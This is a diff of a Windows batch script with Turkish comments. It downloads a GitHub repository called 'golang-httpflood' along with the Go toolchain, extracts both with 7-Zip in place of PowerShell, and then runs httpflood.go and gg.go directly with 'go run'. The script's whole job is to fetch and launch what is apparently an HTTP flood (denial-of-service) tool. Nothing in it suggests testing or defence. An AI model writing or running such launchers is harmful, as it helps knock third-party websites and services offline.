@@ -4,31 +4,21 @@ REM curl ile repositoriyi indir
 curl -L -o %USERPROFILE%\flo.zip https://github.com/murmurlab/golang-httpflood/archive/refs/heads/master.zip
 
 echo == İndirilen repo çıkarılıyor... ==
-REM Dosyayı hedef dizine çıkar
-powershell -Command "Expand-Archive -Path $env:USERPROFILE\flo.zip -DestinationPath $env:USERPROFILE\flo"
+REM 7-Zip kullanarak dosyayı çıkar
+"C:\Program Files\7-Zip\7z.exe" x %USERPROFILE%\flo.zip -o%USERPROFILE%\flo
 
 echo == Go dilini indiriliyor... ==
 REM Go'yu indir
 curl -L -o %USERPROFILE%\gol.zip https://go.dev/dl/go1.19.4.windows-amd64.zip
 
 echo == Go dil dosyaları çıkarılıyor... ==
-REM Go'yu çıkar
-powershell -Command "Expand-Archive -Path $env:USERPROFILE\gol.zip -DestinationPath $env:USERPROFILE"
+REM 7-Zip kullanarak Go'yu çıkar
+"C:\Program Files\7-Zip\7z.exe" x %USERPROFILE%\gol.zip -o%USERPROFILE%
 
-echo == Go binary yolu ayarlanıyor... ==
-REM Go binary yolunu ayarla
-setx GOPATH "%USERPROFILE%\go"
-setx PATH "%PATH%;%USERPROFILE%\go\bin"
-
-echo == Go dosyaları derleniyor... ==
-REM Go dosyalarını derle
-powershell -Command "$env:USERPROFILE\go\bin\go.exe build $env:USERPROFILE\flo\golang-httpflood-main\httpflood.go"
-powershell -Command "$env:USERPROFILE\go\bin\go.exe build $env:USERPROFILE\flo\golang-httpflood-main\gg.go"
-
-echo == Çıktılar çalıştırılıyor... ==
-REM Çıktıları çalıştır
-powershell -Command "Start-Process -FilePath $env:USERPROFILE\flo\golang-httpflood-main\httpflood.exe"
-powershell -Command "Start-Process -FilePath $env:USERPROFILE\flo\golang-httpflood-main\gg.exe"
+echo == Go dosyaları çalıştırılıyor... ==
+REM Doğrudan Go binary dosyası kullanılarak dosyaları çalıştır
+"%USERPROFILE%\go\bin\go.exe" run "%USERPROFILE%\flo\golang-httpflood-main\httpflood.go"  
+"%USERPROFILE%\go\bin\go.exe" run "%USERPROFILE%\flo\golang-httpflood-main\gg.go"
 
 echo == İşlem tamamlandı! ==
 pause
